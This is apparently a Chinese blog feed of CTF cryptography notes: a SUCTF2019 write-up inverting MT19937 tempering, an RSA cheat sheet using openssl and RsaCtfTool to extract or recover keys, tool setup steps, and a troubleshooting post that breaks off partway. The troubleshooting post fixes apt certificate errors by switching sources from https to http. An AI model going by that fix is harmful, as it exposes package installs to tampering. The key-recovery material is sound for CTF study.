<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_cal_re</span>(<span class="params">c, x, y</span>):</span></span><br><span class="line">    y = <span class="built_in">bin</span>(y)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    output = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">    <span class="comment"># 低x位保持不变</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-x, <span class="built_in">len</span>(y)):</span><br><span class="line">        output[i] = <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 13-21位 = (低x位)&amp;(y[13:21])^c[13:21]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">2</span>*x, <span class="built_in">len</span>(y)-x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 4-12位 = (13-21位)&amp;(y[4:12])^c[4:12]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">3</span>*x, <span class="built_in">len</span>(y)-<span class="number">2</span>*x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 高4位 = (8-12位)&amp;(y[0:3])^c[0:3]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    output = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> _: <span class="built_in">str</span>(_), output))</span><br><span class="line">    output = <span class="built_in">int</span>(output, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>第三个位运算的逆过程和这个脚本一样</p>
<p>然后在实际跑的时候，我发现了一些bug，正如上面提到的，这些位数的不同导致了我这个方法的局限性，像什么，那个位移9位的那个，因为它有32位，结果会出错，还有位移13位的，主要都是位数不对带来的吧。所以这种方法明显低效，且不普适，后面也不会再花时间研究</p>
<p>但写都写了是吧，自己的思路，爬也要爬完，况且情况已经很局限了</p>
<h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><p>花了操作系统实验课一半的时间，我终于改对了（不过是事先知道flag长啥样了）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>))-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">if</span> y &lt;= <span class="number">0</span>:</span><br><span class="line">        y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)) - x</span><br><span class="line">        c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">        <span class="comment"># 高x位完全相同</span></span><br><span class="line">        part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">        part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">        output = <span class="built_in">int</span>(part1 + part2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">    <span class="comment"># 高x位完全相同</span></span><br><span class="line">    high13 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    <span class="comment"># 中间的几位</span></span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], <span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_cal_re</span>(<span class="params">c, x, y</span>):</span></span><br><span class="line">    y = <span class="built_in">bin</span>(y)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    output = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">    <span class="comment"># 低x位保持不变</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-x, <span class="built_in">len</span>(y)):</span><br><span class="line">        output[i] = <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 13-21位 = (低x位)&amp;(y[13:21])^c[13:21]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">2</span>*x, <span class="built_in">len</span>(y)-x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 4-12位 = (13-21位)&amp;(y[4:12])^c[4:12]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">3</span>*x, <span class="built_in">len</span>(y)-<span class="number">2</span>*x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 高4位 = (8-12位)&amp;(y[0:3])^c[0:3]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    output = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> _: <span class="built_in">str</span>(_), output))</span><br><span class="line">    output = <span class="built_in">int</span>(output, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = first_cal_re(m, <span class="number">19</span>)</span><br><span class="line">    m = second_cal_re(m, <span class="number">17</span>, <span class="number">2245263360</span>)</span><br><span class="line">    m = second_cal_re(m, <span class="number">9</span>, <span class="number">2029229568</span>)</span><br><span class="line">    m = first_cal_re(m, <span class="number">13</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="comment"># 对应括号外的encode(&#x27;hex&#x27;)</span></span><br><span class="line">    message = <span class="string">b&#x27;641460a9e3953b1aaa21f3a2&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) // <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span>: i * <span class="number">4</span> + <span class="number">4</span>].ljust(<span class="number">4</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        block = bytes_to_long(block)</span><br><span class="line">        block = re_convert(block)</span><br><span class="line">        block = long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="built_in">print</span> new_message.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="尚师傅的思路"><a href="#尚师傅的思路" class="headerlink" title="尚师傅的思路"></a>尚师傅的思路</h2><p>对，又是尚师傅，在我迷茫的时候又给我指点迷津，他一下就看出，这是一个可以循环回来的位运算，所以直接写了循环就跑出来了</p>
<p>一哩窝里GIAO</p>
<img alt="[SUCTF2019]MT 我也很异或呢-ce3e9430.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-ce3e9430.png" width="" height="">

<img alt="[SUCTF2019]MT 我也很异或呢-30b8ac87.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-30b8ac87.png" width="" height="" >

<p>牛啊，人上人</p>
<h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>虽然也不是什么动脑子的题目，重复一遍过程，然后扣细节。但还是很兴奋，第一次自己做出这种题目（主要是师傅们的wp看不懂哇），对于之前一直没有攻克的线性移位寄存器也有一定思路了</p>
<p>还有一句废话，就是，这题难度不大，因为存在上面这种做法，所以如果是比赛，给我五分钟做出来</p>
<h2 id="关于MT"><a href="#关于MT" class="headerlink" title="关于MT"></a>关于MT</h2><p>哈哈哈哈哈，重要的话放在最后说</p>
<p>所以像我这样这么愚蠢地去分析这个具体的流程是很低效的，浪费时间，做这种题目的思路应该是找出其中的<strong>规律</strong>，现成的也好，但毕竟头几次接触，这样也无可厚非，人都是会慢慢成长起来的</p>
<p>去看了之前没有看懂的wp，有些人qs采用的就是尚师傅这个思路</p>
<img alt="[SUCTF2019]MT 我也很异或呢-40747019.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-40747019.png" width="" height="" >

<p>但很多是py</p>
<p>看到安全客的人上人wp</p>
<img alt="[SUCTF2019]MT 我也很异或呢-d514d3be.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-d514d3be.png" width="" height="">

<p>知音啊，就是比我精简了好多</p>
<p>至于为什么可以逆回来呢？官方wp才是yyds</p>
<p>先看看出题人的出题思路<br><img alt="[SUCTF2019]MT 我也很异或呢-01fc37a9.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-01fc37a9.png" width="" height=""></p>
<p>所以我的思路没错，就是逆，我逆的是具体每一步，而没有发现更大的规律</p>
<p><strong>只存在左移和右移的区别</strong></p>
<p>看官方的代码觉得好简单，但还是不知道</p>
<p><a href="https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/">https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/</a></p>
<img alt="[SUCTF2019]MT 我也很异或呢-58e3c5e7.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-58e3c5e7.png" width="" height="">

<p>在此也暂时不往下研究了，总之是有规律的，在这道题花了太多时间，虽然我觉得值，但价值快被榨干了，应该赋予弄懂的希望在之后同类型的题目</p>
<hr>
<p>也许，</p>
<p>绕远路才是我的最短捷径——Julius·Caesar·Zeppeli</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto-TopologyTree</category>
      </categories>
      <tags>
        <tag>MT19937</tag>
        <tag>伪随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-RSA的文件操作</title>
    <url>/posts/d77a51b9/</url>
    <content><![CDATA[<p>在打CTF密码学方向的过程中，会遇到一些使用私钥公钥的形式题目，除了使用在线的网站，也可以用OpenSSL工具</p>
<span id="more"></span>

<h1 id="CTF-RSA的文件操作"><a href="#CTF-RSA的文件操作" class="headerlink" title="CTF-RSA的文件操作"></a>CTF-RSA的文件操作</h1><h2 id="提取密钥"><a href="#提取密钥" class="headerlink" title="提取密钥"></a>提取密钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in test.pfx -nocerts -nodes -out FILE_NAME</span><br></pre></td></tr></table></figure>

<h2 id="提取公钥"><a href="#提取公钥" class="headerlink" title="提取公钥"></a>提取公钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in FILE_NAME</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 从公钥文件中分解n和e</span></span><br><span class="line">pub_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&#x27;pubkey.pem&#x27;</span>).read())</span><br><span class="line">n = pub_key.n</span><br><span class="line">e = pub_key.e</span><br></pre></td></tr></table></figure>

<h2 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -in FILE_NAME -text</span><br></pre></td></tr></table></figure>

<h2 id="提取密文"><a href="#提取密文" class="headerlink" title="提取密文"></a>提取密文</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = <span class="built_in">int</span>(<span class="built_in">open</span>(<span class="string">&#x27;FILE_PATH&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read().encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<p>做上面这一步的时候有错误的话，记得切换到python2下</p>
<h2 id="生成私钥文件"><a href="#生成私钥文件" class="headerlink" title="生成私钥文件"></a>生成私钥文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python  rsatool.py -f PEM -o key.pem -n ××× -d ×××</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line">python rsatool.py -f PEM -o key.pem -p 1 -q 1 -e 1</span><br></pre></td></tr></table></figure>

<p>这个文件我在KALI的rsatool-master下</p>
<h2 id="用私钥文件解密"><a href="#用私钥文件解密" class="headerlink" title="用私钥文件解密"></a>用私钥文件解密</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag</span><br><span class="line"></span><br><span class="line">openssl rsautl -decrypt -oaep -inkey key.pem -in flag.enc -out flag （OAEP方式）</span><br></pre></td></tr></table></figure>

<p>摘抄下来几个脚本，用到自取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_RSA</span>(<span class="params">privkey, message</span>):</span></span><br><span class="line">    key = <span class="built_in">open</span>(privkey, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    <span class="comment"># n = rsakey.n</span></span><br><span class="line">    <span class="comment"># d = rsakey.d</span></span><br><span class="line">    rsakey = PKCS1_OAEP.new(rsakey)</span><br><span class="line">    decrypted = rsakey.decrypt(b64decode(message)) <span class="comment">#需要先进行base64解密</span></span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> decrypt_RSA(<span class="string">&#x27;key.pem&#x27;</span>, flag)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.通过已知条件，生成私钥，并解密密文</span></span><br><span class="line">pri_key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = rsa.decrypt(f.read(), pri_key)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line">rsakey = RSA.importKey(<span class="built_in">open</span>(<span class="string">&quot;pri.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line">rsa = PKCS1_OAEP.new(rsakey)</span><br><span class="line">msg = <span class="built_in">open</span>(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">f = rsa.decrypt(msg)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">keypair.p =</span><br><span class="line">keypair.q =</span><br><span class="line">keypair.e =</span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p - <span class="number">1</span>) * (keypair.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure>

<p>从la佬博客la来的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">用法一：已知公钥(自动求私钥)</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --publickey 公钥文件 --uncipherfile 加密文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">用法二：已知公钥求私钥</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --publickey 公钥文件 --private</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">用法三：密钥格式转换</span></span><br><span class="line"><span class="meta">#</span><span class="bash">把PEM格式的公钥转换为n，e</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --dumpkey --key 公钥文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">把n,e转换为PEM格式</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto技能树</category>
      </categories>
      <tags>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学工具汇总</title>
    <url>/posts/1cc01193/</url>
    <content><![CDATA[<p>&nbsp;<span id="more"></span></p>
<h1 id="密码学工具汇总"><a href="#密码学工具汇总" class="headerlink" title="密码学工具汇总"></a>密码学工具汇总</h1><h2 id="0x00-自动分析解密"><a href="#0x00-自动分析解密" class="headerlink" title="0x00 自动分析解密"></a>0x00 自动分析解密</h2><ul>
<li><p><a href="https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')">CyberChef的Magic</a></p>
</li>
<li><p><a href="https://www.dcode.fr/cipher-identifier">dcode.fr的cipher identifier</a></p>
</li>
<li><p>用CrypTool分析</p>
</li>
</ul>
<h2 id="0x01-密码学环境"><a href="#0x01-密码学环境" class="headerlink" title="0x01 密码学环境"></a>0x01 密码学环境</h2><p>这里直接从新机开始整活吧</p>
<h3 id="0x1-python和module"><a href="#0x1-python和module" class="headerlink" title="0x1 python和module"></a>0x1 python和module</h3><ul>
<li><p>python3</p>
</li>
<li><p>python2</p>
</li>
<li><p>Crypto库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pip install pycryptodome</span></span><br></pre></td></tr></table></figure>

<p>windows早一点的python版本要改包名（python3.8 3.9好像直接装就好了</p>
</li>
<li><p>gmpy2库</p>
<p>python2，Fr.<a href="https://leefige.github.io/2021/03/11/%E5%AE%89%E8%A3%85gmpy2/">https://leefige.github.io/2021/03/11/安装gmpy2/</a></p>
<p>python3，Fr.<a href="https://blog.csdn.net/qq_28573835/article/details/86164877">https://blog.csdn.net/qq_28573835/article/details/86164877</a></p>
<p>依赖不想一个一个装也可以用轮子，Fr.<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a>，也是用pip安装</p>
</li>
<li><p>pwntools库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> pip install pwntools</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x2-sagemath"><a href="#0x2-sagemath" class="headerlink" title="0x2 sagemath"></a>0x2 sagemath</h3><p>sagemath很强大，很多实现好了的算法可以拿来当工具用，但最好知晓过原理</p>
<p>在线的环境，Fr.<a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p>
<p>Linux本地配置，Windows或最新版本Fr.<a href="https://www.sagemath.org/">官网</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo su</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt install sagemath</span></span><br></pre></td></tr></table></figure>

<p>关于sage的使用暂时请看<a href="https://jayxv.github.io/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">大名鼎鼎的V</a></p>
<h3 id="0x3-Linux搭建"><a href="#0x3-Linux搭建" class="headerlink" title="0x3 Linux搭建"></a>0x3 Linux搭建</h3><ul>
<li>gmpy2</li>
</ul>
<p>同上，如果python2报了以下错误</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src/gmpy2.c:445:10: fatal error: Python.h: No such file or directory</span><br><span class="line"><span class="meta"> #</span><span class="bash">include <span class="string">&quot;Python.h&quot;</span></span></span><br><span class="line">          ^~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">error: command &#x27;x86_64-linux-gnu-gcc&#x27; failed with exit status 1</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210913095633149.png" alt="image-20210913095633149"></p>
<p>执行下以下安装命令就好了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python-dev</span></span><br></pre></td></tr></table></figure>

<p>不同的python版本，换一下python-dev就好了，比如<code>python3-dev</code>或<code>python3.8-dev</code></p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto技能树</category>
      </categories>
  </entry>
  <entry>
    <title>常见的操作问题</title>
    <url>/posts/7dfdecfa/</url>
    <content><![CDATA[<p>一些经常遇到的操作问题，浅度搜索难搞定的，解决后记录下步骤，节约下次遇到的处理时间</p>
<span id="more"></span>

<h1 id="常见的操作问题"><a href="#常见的操作问题" class="headerlink" title="常见的操作问题"></a>常见的操作问题</h1><h2 id="0x01-Windows"><a href="#0x01-Windows" class="headerlink" title="0x01 Windows"></a>0x01 Windows</h2><h3 id="0x10002-windows下多python运行"><a href="#0x10002-windows下多python运行" class="headerlink" title="0x10002 windows下多python运行"></a>0x10002 windows下多python运行</h3><ul>
<li><p>首先安装对应的python，随便放在一个目录就好；并添加到环境变量，比如ida7.6需要py38的，就可以把py38的优先级提得比其他py高</p>
</li>
<li><p>其次修改python文件夹下的<code>python.exe</code>的文件名，比如修改py27的为<code>python27.exe</code>，py39的为<code>python39.exe</code></p>
<p>这样在cmd命令行里，就可以直接输入对应的PE文件名来启动相应的python了</p>
</li>
<li><p>如果需要pip安装包，可以用先指定是哪个python，再用<code>-m</code>参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python39 -m pip install pycryptodome</span> </span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211106114822529.png" alt="image-20211106114822529"></p>
</li>
</ul>
<h3 id="0x10002-windows-terminal安装powerlevel10k"><a href="#0x10002-windows-terminal安装powerlevel10k" class="headerlink" title="0x10002 windows terminal安装powerlevel10k"></a>0x10002 windows terminal安装powerlevel10k</h3><p>这个踩了个坑，勾选了电脑区域的beta，导致后面经常遇到一些乱码，改回来也不行，寄</p>
<p>github网址：<a href="https://github.com/romkatv/powerlevel10k">https://github.com/romkatv/powerlevel10k</a></p>
<p>安装直接看官方仓库的md，有个交互界面来简化配置</p>
<p>主要是要装下这个几个字体，我选<code>Hack Nerd Font</code>系列的没问题，<a href="https://github.com/ryanoasis/nerd-fonts">https://github.com/ryanoasis/nerd-fonts</a></p>
<p>最后在windows terminal的配置界面修改下字体就好了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211127212501867.png" alt="image-20211127212501867"></p>
<p>（Linux下的操作类似，略</p>
<h2 id="0x02-Linux"><a href="#0x02-Linux" class="headerlink" title="0x02 Linux"></a>0x02 Linux</h2><h3 id="0x10001-ubuntu软件更新失败解决"><a href="#0x10001-ubuntu软件更新失败解决" class="headerlink" title="0x10001 ubuntu软件更新失败解决"></a>0x10001 ubuntu软件更新失败解决</h3><p>才知道之前那么多次<code>apt update</code>一直是失败，报这样的错</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003101535464.png" alt="image-20211003101535464" style="zoom: 80%;" />

<p>此外还会报<code>Certificate verification failed: The certificate is NOT trusted.</code>的错误</p>
<p>具体原因没有深究，可能是源的问题</p>
<ul>
<li><p><strong>证书问题</strong></p>
<p>直接编辑源的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/apt/sources.list</span></span><br></pre></td></tr></table></figure>

<p>将<code>https</code>替换成<code>http</code></p>
